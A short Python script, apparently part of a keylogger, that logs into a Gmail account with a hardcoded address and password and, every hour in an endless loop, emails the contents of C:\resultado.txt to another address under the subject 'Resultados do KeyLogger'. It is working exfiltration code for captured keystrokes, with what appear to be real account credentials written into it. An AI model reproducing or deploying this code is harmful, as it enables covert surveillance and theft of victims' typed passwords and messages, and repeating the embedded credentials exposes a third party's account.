import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from time import sleep

servidor = smtplib.SMTP('smtp.gmail.com: 587')
servidor.starttls()
email = 'noahgoncalveshost@gmail.com'
senha = 'ironman0552'
servidor.login(email, senha)
destinatario = 'elian.valdez09@gmail.com'


while True:
	sleep(3600)
	msg = MIMEMultipart()
	msg['From'] = email
	msg['To'] = destinatario
	msg['Subject'] = 'Resultados do KeyLogger'
	file = open('C:\\resultado.txt').read()
	msg.attach(MIMEText(file))
	servidor.sendmail(msg['From'], msg['To'], msg.as_string())

